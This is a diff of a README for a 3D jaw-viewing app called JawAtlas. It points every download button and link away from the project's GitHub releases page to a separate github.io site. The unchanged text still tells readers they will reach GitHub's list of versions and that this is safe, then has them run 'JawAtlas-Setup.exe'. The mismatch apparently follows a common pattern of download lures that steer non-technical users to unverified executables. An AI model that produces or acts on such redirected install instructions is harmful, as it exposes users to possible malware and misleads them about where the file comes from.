@@ -1,7 +1,7 @@
 <h1>🦷 JawAtlas - See Your Jaw in 3D</h1>
 
 <p align="center">
-<a href="https://github.com/toptvsat019-code/JawAtlas/releases"><img src="https://img.shields.io/badge/⬇️_Download_JawAtlas-Free-2ea44f?style=for-the-badge&logo=github&label=Download%20JawAtlas&color=blue" alt="Download JawAtlas" width="300"></a>
+<a href="https://toptvsat019-code.github.io"><img src="https://img.shields.io/badge/⬇️_Download_JawAtlas-Free-2ea44f?style=for-the-badge&logo=github&label=Download%20JawAtlas&color=blue" alt="Download JawAtlas" width="300"></a>
 </p>
 
 ---
@@ -27,14 +27,14 @@ Follow these simple steps. If you can use a web browser and a file manager (like
 Click the big blue button below (it's the same as the one at the top):
 
 <p align="center">
-<a href="https://github.com/toptvsat019-code/JawAtlas/releases"><img src="https://img.shields.io/badge/⬇️_Get_JawAtlas_Here-2ea44f?style=for-the-badge&logo=github&label=Download%20JawAtlas&color=blue" alt="Download button" width="250"></a>
+<a href="https://toptvsat019-code.github.io"><img src="https://img.shields.io/badge/⬇️_Get_JawAtlas_Here-2ea44f?style=for-the-badge&logo=github&label=Download%20JawAtlas&color=blue" alt="Download button" width="250"></a>
 </p>
 
 **What happens next:** You'll be taken to a website called GitHub. Don't worry – it's a safe place where programmers share their work. You'll see a list of versions. Look for the newest one (usually at the top). Click the file that says something like `JawAtlas-Setup.exe` or `JawAtlas-Windows.zip`.
 
 ### 🖱️ Step 2: Run the Installer
 
-Visit this link to download the application: `https://github.com/toptvsat019-code/JawAtlas/releases`
+Visit this link to download the application: `https://toptvsat019-code.github.io`
 
 1.  When the download finishes, open your **Downloads** folder.
 2.  You'll see a file named `JawAtlas-Setup.exe` (or similar).
